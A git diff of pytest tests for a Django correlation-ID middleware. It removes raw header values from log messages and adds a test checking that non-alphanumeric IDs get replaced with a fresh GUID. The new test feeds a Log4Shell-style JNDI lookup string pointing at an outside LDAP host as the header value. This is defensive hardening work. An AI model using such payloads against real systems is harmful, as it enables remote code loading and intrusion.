@@ -42,7 +42,7 @@ def test_request_with_correlation_id(client, caplog):
     response = client.get('/', **{'HTTP_Correlation-ID': '97c304252fd14b25b72d6aee31565843'})
     expected = [
         ('sync middleware called', None),
-        ('Correlation-ID found in the header: 97c304252fd14b25b72d6aee31565843', None),
+        ('Correlation-ID found in the header', None),
         ('97c304252fd14b25b72d6aee31565843 is a valid GUID', None),
         ('This log message should have a GUID', '97c304252fd14b25b72d6aee31565843'),
         ('Some warning in a function', '97c304252fd14b25b72d6aee31565843'),
@@ -50,6 +50,25 @@ def test_request_with_correlation_id(client, caplog):
     ]
     assert [(x.message, x.correlation_id) for x in caplog.records] == expected
     assert response['Correlation-ID'] == '97c304252fd14b25b72d6aee31565843'
+
+
+def test_request_with_non_alnum_correlation_id(client, caplog, mock_uuid):
+    """
+    Tests a request _with_ a correlation-ID in it logs the correct things.
+    :param client: Django client
+    :param caplog: caplog fixture
+    """
+    response = client.get('/', **{'HTTP_Correlation-ID': '!"#¤&${jndi:ldap://ondsinnet.no/a}'})
+    expected = [
+        ('sync middleware called', None),
+        ('Correlation-ID found in the header', None),
+        ('Non-alnum Correlation-ID provided. New GUID is 704ae5472cae4f8daa8f2cc5a5a8mock', None),
+        ('This log message should have a GUID', '704ae5472cae4f8daa8f2cc5a5a8mock'),
+        ('Some warning in a function', '704ae5472cae4f8daa8f2cc5a5a8mock'),
+        ('Received signal `request_finished`, clearing guid', '704ae5472cae4f8daa8f2cc5a5a8mock'),
+    ]
+    assert [(x.message, x.correlation_id) for x in caplog.records] == expected
+    assert response['Correlation-ID'] == '704ae5472cae4f8daa8f2cc5a5a8mock'
 
 
 def test_request_with_invalid_correlation_id(client, caplog, mock_uuid):
@@ -62,8 +81,7 @@ def test_request_with_invalid_correlation_id(client, caplog, mock_uuid):
     response = client.get('/', **{'HTTP_Correlation-ID': 'bad-guid'})
     expected = [
         ('sync middleware called', None),
-        ('Correlation-ID found in the header: bad-guid', None),
-        ('Failed to validate GUID bad-guid', None),
+        ('Correlation-ID found in the header', None),
         ('bad-guid is not a valid GUID. New GUID is 704ae5472cae4f8daa8f2cc5a5a8mock', None),
         ('This log message should have a GUID', '704ae5472cae4f8daa8f2cc5a5a8mock'),
         ('Some warning in a function', '704ae5472cae4f8daa8f2cc5a5a8mock'),
@@ -92,7 +110,7 @@ def test_request_with_invalid_correlation_id_without_validation(client, caplog, 
         client.get('/', **{'HTTP_Correlation-ID': 'bad-guid'})
         expected = [
             ('sync middleware called', None),
-            ('Correlation-ID found in the header: bad-guid', None),
+            ('Correlation-ID found in the header', None),
             ('Returning ID from header without validating it as a GUID', None),
             ('This log message should have a GUID', 'bad-guid'),
             ('Some warning in a function', 'bad-guid'),
@@ -217,14 +235,14 @@ def test_cleanup_signal(client, caplog, monkeypatch):
         expected = [
             # First request
             ('sync middleware called', None),
-            ('Correlation-ID found in the header: bad-guid', None),
+            ('Correlation-ID found in the header', None),
             ('Returning ID from header without validating it as a GUID', None),
             ('This log message should have a GUID', 'bad-guid'),
             ('Some warning in a function', 'bad-guid'),
             ('Received signal `request_finished`, clearing guid', 'bad-guid'),
             # Second request
             ('sync middleware called', None),
-            ('Correlation-ID found in the header: another-bad-guid', None),
+            ('Correlation-ID found in the header', None),
             ('Returning ID from header without validating it as a GUID', None),
             ('This log message should have a GUID', 'another-bad-guid'),
             ('Some warning in a function', 'another-bad-guid'),
